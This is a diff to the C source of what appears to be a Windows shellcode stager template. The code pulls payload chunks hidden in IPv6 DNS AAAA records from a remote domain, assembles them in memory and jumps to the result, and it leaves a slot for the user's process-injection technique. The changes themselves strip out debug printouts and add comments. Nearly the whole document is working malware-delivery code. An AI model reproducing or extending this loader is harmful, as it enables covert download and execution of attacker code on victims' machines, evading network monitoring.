@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <stdio.h>
 
+
 typedef struct in6_addr {
   union {
     u_char Byte[16];
@@ -36,8 +37,6 @@ LPVOID *GetShellCodeAddress(){
 
   // Save the original allocated memory for later use
   void *original_allbuffer2 = allbuffer2;
-  printf("[+] allbuffer2 address is : %p\n", allbuffer2);
-  printf("[+] original_allbuffer2 address is : %p\n", original_allbuffer2);
 
   // Pointer to the domain name for later use
   char *domain;
@@ -49,12 +48,12 @@ LPVOID *GetShellCodeAddress(){
     // Send IPV6 "AAAA" request to the domain
     resp = DnsQuery_A(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
     if(resp != 0){
-      printf("[+] Error resolving host!\n");
       // Important break in case the domain is not resolvable
       // Also Important to know the last domain to call for
       break;
     }else{
-      printf("[+] Host Resolved!\n");
+      // Debug Message
+      // printf("[+] Host Resolved!\n");
     }
 
     // Save The IPV6 "Shellcode" chunck
@@ -81,8 +80,8 @@ i++;
 // Sleep based on user input
 sleep({SLEEPTIME});
 }
-printf("[+] allbuffer2 address is : %p\n", allbuffer2);
 
+// Return the final decoded shellcode pointer
 return *allbuffer2;
 
 
@@ -98,7 +97,7 @@ LPVOID ShellcodeAddress = GetShellCodeAddress()
 // Write your injection technique here
 // And use ShellcodeAddress as your shellcode pointer
 
-// Jump to shellcode
+// Jump to shellcode (Replace it with your technique ;) )
 goto *ShellcodeAddress;
 
 
